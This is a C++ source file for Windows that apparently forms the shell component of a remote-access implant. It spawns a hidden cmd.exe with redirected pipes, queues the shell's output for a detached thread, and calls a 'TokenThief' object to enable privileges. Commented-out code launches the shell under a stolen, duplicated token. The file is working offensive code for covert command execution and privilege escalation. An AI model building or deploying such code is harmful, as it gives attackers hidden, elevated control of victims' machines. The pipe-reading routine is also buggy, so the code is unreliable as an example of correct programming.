#include "CMD.hpp"
#include <iostream>
#include "Escalation.hpp"

//#include "Sync.hpp"
extern TokenThief* tokenThief;

#define BUFFSIZE 4096

CMD::CMD() {
    cmdPtr = std::shared_ptr<CMD>(this);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&child_IN_READ, &child_IN_WRITE, &sa, 0))
        std::cout << "\n[-] Could not create pipe: child_IN_READ, child_IN_WRITE. Error:" << GetLastError() << std::endl;;
        
    if (!CreatePipe(&child_OUT_READ, &child_OUT_WRITE, &sa, 0)) 
        std::cout << "\n[-] Could not create pipe: child_OUT_READ, child_OUT_WRITE. Error: " << GetLastError() << std::endl;;

    if (!SetHandleInformation(child_IN_WRITE, HANDLE_FLAG_INHERIT, 0))
        std::cout << "\n[-] Could not set flags for child_IN_WRITE. Error: " << GetLastError() << std::endl;

    if (!SetHandleInformation(child_OUT_READ, HANDLE_FLAG_INHERIT, 0))
        std::cout << "\n[-] Could not set flags for child_OUT_READ. Error:" << GetLastError() << std::endl;
}

CMD::~CMD() {
    CloseHandle(child_IN_WRITE);
    CloseHandle(child_IN_READ);
    CloseHandle(child_OUT_WRITE);
    CloseHandle(child_OUT_READ);
}

int CMD::Session() {
    while (cmdOpen) {
        commandQueueOut.push_back(ReadPipe());
    }
    std::cout << "[-] CMD closed." << std::endl;
    return 0;
}

bool CMD::Start() {
    if(!Spawn()) std::cout << "\n[-] Could not spawn process." << std::endl;
    std::jthread jtSession(&CMD::Session, std::ref(*cmdPtr));
    if (jtSession.joinable()) {
        std::cout << "\n[+] Session jthread created." << std::endl;
        jtSession.detach();
   }
   else  std::cout << "[-] Error creating Session jthread.\n" << std::endl;
   return true;
}

void CMD::WritePipe(std::string command) {
    DWORD dwWritten, dwRead;
    BOOL res; 
    command += "\n";
    res = WriteFile(child_IN_WRITE, command.c_str(), command.length(), &dwWritten, NULL);
    if (!res || dwWritten == 0) {  
        std::cout << "\n[-] Error WriteFile. Error";
    }
    
}

std::string CMD::ReadPipe() {
    Sleep(50);
    DWORD bytesRead, bytesAvailable ;
    DWORD temp, res  = 0;
    std::string message;
    
    PCHAR buffer = new CHAR[BUFFSIZE];
    do { 
        PeekNamedPipe( child_OUT_READ, NULL, 0, NULL, &bytesAvailable, NULL ); 
    } while (bytesAvailable == 0);

    temp = bytesAvailable;
    /*
            [!] [!] [!]
            pipe gets clogged 
            buffer must be resied in between reading
    */
    do {
        res = ReadFile(child_OUT_READ, buffer, BUFFSIZE, &bytesRead, NULL);
        bytesAvailable -= bytesRead;
        message += buffer;
    } while (bytesAvailable > 0 );
    message.resize(temp);
    delete[] buffer;
    return message;
}

bool CMD::Spawn() {

    

    WCHAR processToSpawn[] = L"C:\\Windows\\system32\\cmd.exe";
    bool isProcessCreated;

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&si, sizeof(si));

    si.hStdError = child_OUT_WRITE; // test 3
    si.hStdOutput = child_OUT_WRITE;
    si.hStdInput = child_IN_READ;
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESTDHANDLES;

    tokenThief->EnablePrivileges();
   // tokenThief->TokenSession();




    isProcessCreated = CreateProcess(processToSpawn,
        NULL,           // command line 
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        CREATE_NO_WINDOW,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &si,  // STARTUPINFO pointer 
        &pi);  // receives PROCESS_INFORMATION 

     //isProcessCreated =CreateProcessAsUserW( tokenThief->duplicateTokenPrimaryHandle,
     //   processToSpawn,
     //   NULL,           // command line 
     //   NULL,          // process security attributes 
     //   NULL,          // primary thread security attributes 
     //   TRUE,          // handles are inherited 
     //   CREATE_NO_WINDOW,             // creation flags 
     //   NULL,          // use parent's environment 
     //   NULL,          // use parent's current directory 
     //   &si,  // STARTUPINFO pointer 
     //   &pi);  // receives PROCESS_INFORMATION 



    if (!isProcessCreated) {
        printf("[-] Couldn't spawn child process");
        int a = GetLastError();
        CloseHandle(child_IN_READ);
        CloseHandle(child_OUT_WRITE);
        return false;
    }
    printf("[+] Child process spawned");
    cmdOpen = true;
    return true;
}



/*
Sync sync;
std::mutex Sync::cmdMutex;
std::mutex Sync::commMutex;
HANDLE Sync::cmdInstructionObtained;
HANDLE Sync::clientBufferFilled;
HANDLE Sync::shellOutputReceived;
HANDLE Sync::eConnSend;
HANDLE Sync::eConnRecv;
std::vector<HANDLE> Sync::eConnVector;
*/

